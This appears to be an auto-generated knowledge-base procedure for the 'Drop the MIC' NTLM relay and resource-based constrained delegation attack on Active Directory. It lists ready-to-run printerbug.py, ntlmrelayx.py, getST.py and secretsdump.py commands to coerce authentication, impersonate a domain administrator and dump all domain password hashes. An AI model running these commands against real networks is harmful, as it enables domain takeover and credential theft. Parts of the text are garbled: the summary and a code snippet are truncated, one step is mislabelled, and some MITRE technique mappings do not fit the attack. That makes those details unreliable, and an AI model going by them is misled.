---
id: b810df38-1b9d-4c46-bcaf-896041560576
name: Drop the MIC - Resource Based Constrained Delegation Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.545259+00:00'
updated_at: '2023-04-10T20:26:36.903240+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Kerberoasting|T1208 - Kerberoasting]]'
- '[[Pass the Hash|T1075 - Pass the Hash]]'
- '[[Replication Through Removable Media|T1091 - Replication Through Removable Media]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Drop the MIC]]'
- '[[Man-in-the-Middle attacks & relaying]]'
commands:
- '[[Connect using ticket]]'
- '[[Create new machine account]]'
- '[[Get service ticket]]'
- '[[Run ntlmrelayx.py to escalate user privileges]]'
- '[[Run printerbug.py script]]'
- '[[Run printerbug.py to exploit target machine]]'
- '[[Run secretsdump.py to extract DC secrets]]'
---

# Drop the MIC - Resource Based Constrained Delegation Attack

## Summary

The Resource-Based Constrained Delegation attack is a technique used to escalate privileges and gain access to sensitive data in Active Directory. By exploiting a vulnerability in the way Windows implements constrained delegation, an attacker can impersonate a legitimate user and access resources t

## Description

# Description

The Resource-Based Constrained Delegation attack is a technique used to escalate privileges and gain access to sensitive data in Active Directory. By exploiting a vulnerability in the way Windows implements constrained delegation, an attacker can impersonate a legitimate user and access resources they are authorized to access. This attack can be carried out by dumping password hashes using the SpoolService bug and DCSync or by using a Man-in-the-Middle attack to relay authentication attempts. Once the attacker has access to the targeted resource, they can perform various malicious activities such as exfiltrating sensitive data or deploying malware. This attack can be used to gain a foothold in the network and move laterally to other systems.

## Requirements

1. Access to the target network

1. Administrator or domain user credentials

## Defense

1. Implementing proper network segmentation to limit access to sensitive resources

1. Implementing multi-factor authentication to prevent credential theft

1. Monitoring network traffic for suspicious activity

## Objectives

1. Gain access to sensitive data in Active Directory

1. Escalate privileges

1. Move laterally to other systems

# Instructions

1. 1. Connect over SMB to a victim Exchange server using any AD account.
2. Trigger the SpoolService bug.
3. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP.
4. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account.
5. Use DCSync to dump all password hashes in AD.

**Code**: [[TERM1> python printerbug.py testsegment.local/user]]

> This command is used to dump all password hashes in an Active Directory domain using the SpoolService bug and DCSync. The attacker connects over SMB to a victim Exchange server and triggers the SpoolService bug. The attacker server then connects back to the attacker over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, the attacker grants DCSync privileges to their account. The attacker account can then use DCSync to dump all password hashes in AD. This can be used to gain access to other accounts and escalate privileges.

**Command** ([[Run printerbug.py to exploit target machine]]):

```bash
python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>
```

**Command** ([[Run ntlmrelayx.py to escalate user privileges]]):

```bash
ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
```

**Command** ([[Run secretsdump.py to extract DC secrets]]):

```bash
secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
```

2. To execute the attack, perform the following steps:
1. Create a new machine account.
2. Using any AD account, connect over SMB to the victim server and trigger the SpoolService bug.
3. The attacker server will connect back to the attacker over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP.
4. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker.
5. Connect using the ticket.
6. Execute secretsdump.py to access the victim server.

**Code**: [[# create a new machine account
TERM1> ntlmrelayx.p]]

> This command exploits a bug in the SpoolService to gain access to the victim server. The attacker can use any AD account to connect over SMB to the victim server and trigger the SpoolService bug. The attacker server will connect back to the attacker over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, the attacker can grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.

**Command** ([[Create new machine account]]):

```bash
ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support
```

**Command** ([[Run printerbug.py script]]):

```bash
python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
```

**Command** ([[Get service ticket]]):

```bash
getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME
```

**Command** ([[Connect using ticket]]):

```bash
export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
secretsdump.py -k -no-pass second-dc-server.local -just-dc
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Initial Access|TA0001 - Initial Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Kerberoasting|T1208 - Kerberoasting]]
- [[Pass the Hash|T1075 - Pass the Hash]]
- [[Replication Through Removable Media|T1091 - Replication Through Removable Media]]

## Commands Used

- [[Connect using ticket]]
- [[Create new machine account]]
- [[Get service ticket]]
- [[Run ntlmrelayx.py to escalate user privileges]]
- [[Run printerbug.py script]]
- [[Run printerbug.py to exploit target machine]]
- [[Run secretsdump.py to extract DC secrets]]

## Tags

- [[Active Directory Attacks]]
- [[Drop the MIC]]
- [[Man-in-the-Middle attacks & relaying]]
